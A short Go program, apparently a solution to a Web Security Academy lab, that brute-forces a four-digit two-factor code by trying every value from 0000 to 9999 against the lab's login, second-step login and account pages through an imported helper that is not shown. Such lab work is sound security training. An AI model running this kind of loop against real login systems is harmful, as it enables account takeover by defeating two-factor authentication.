package main

import (
	"2falab/brute"
	"fmt"
)

// Set Up Url Var
var (
	mfa          string
	urlLogIn     string = "https://0a9100b50340b8d980f3fd9e00ab00c9.web-security-academy.net/login"
	urlLogIn2    string = "https://0a9100b50340b8d980f3fd9e00ab00c9.web-security-academy.net/login2"
	urlMyAccount string = "https://0a9100b50340b8d980f3fd9e00ab00c9.web-security-academy.net/my-account"
)

func main() {
	for i := 0; i <= 9999; i++ {
		mfa = fmt.Sprintf("%04d", i)
		fmt.Println("Trying:", mfa)

		found, err := brute.BruteForcer(urlLogIn, urlLogIn2, urlMyAccount, mfa)
		if err != nil {
			fmt.Println(err)
		}

		if found {
			return
		}

	}

}
